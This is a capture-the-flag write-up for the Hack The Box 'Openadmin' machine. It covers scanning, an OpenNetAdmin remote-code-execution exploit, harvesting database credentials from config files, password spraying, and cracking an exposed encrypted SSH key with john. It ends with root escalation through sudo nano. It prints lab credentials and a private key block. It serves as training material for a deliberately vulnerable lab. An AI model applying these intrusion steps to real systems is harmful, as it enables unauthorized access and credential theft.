# Openadmin
Box IP **10.10.10.171**


### Nmap scan

```bash
$ nmap -sC -sV -T5 -v openadmin.htb
```

### Services
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Fuzzing

Trying to fuzz for web directories

```bash
$ gobuster dir -u "http://10.10.10.171" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log
```

we find a website **/marga** and **/ona** the OpenNetAdmin page, where an alert shows up complaining about the installed version

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Openadmin/src/1.png" alt="1" />
</p>


### Getting a shell

Searching for **OpenNetAdmin** we find two exploits for a RCE vulnerability
- [47772](https://www.exploit-db.com/exploits/47772)
- [47691](https://www.exploit-db.com/exploits/47691)

We get a shell as **www-data** and we find two usernames
```
$ ./47691.sh 10.10.10.171/ona/
$ whoami
www-data
$ ls /home
jimmy
joanna
```

### Search for interesting files

By searching for config files
```
$ find . -type f -name "config*"
./config/config.inc.php
./workspace_plugins/builtin/host_actions/config.inc.php
./config_dnld.php
./modules/ona/configuration.inc.php
```

and catting **config.inc.php** we find 2 interesting references to files
**/var/log/ona.log**
**/local/config/database_settings.inc.php**

we got some DB creds **ona_sys:n1nj4W4rri0R!**
```
$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

### SSH jimmy

By password spraying with the two users we successfully SSHing as **jimmy** but we got no user.txt flag

In **/var/www/internal** we got **login.php**, **logout.php** and **main.php**

where a successfully login in **login.php** leads to **main.php**
```php
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
}
```

and the joanna SSH key is catted

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

By looking at listening services

```bash
$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6      70      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -  
```

where 3306 is mysql and 52846 is our service!

This is also confirmed in

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Openadmin/src/2.png" alt="1" />
</p>

We get **joanna** encrypted key by curling http://127.0.0.1:52846/main.php

```
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

### SSH joanna

We crack the encrypted key with john
```bash
$ locate ssh2john.py
$ python /usr/share/john/ssh2john.py prvJoanna > prvJoanna.hash
$ john -wordlist:/usr/share/wordlists/rockyou.txt prvJoanna.hash
```

and we get the password **bloodninjas**

By SSHing we got joanna shell and the **user.txt**
```
$ ssh -i prvJoanna joanna@openadmin.htb
```

### Privilege Escalation

Joanna can nano /opt/priv as super user without requiring password

```bash
$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

As [gtfobins](https://gtfobins.github.io/gtfobins/nano/) suggests we can
- Spawn a [shell](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Linux#nano)
- [Read](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Linux#nano) **root.txt**
- [Write](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Linux#nano) [/etc/sudoers](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Linux#sudoers) and then **sudo su**


<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Openadmin/src/3.png" alt="1" />
</p>



If you liked this write-up, please leave a respect on my hackthebox

![htbbadge](https://www.hackthebox.eu/badge/image/77747)
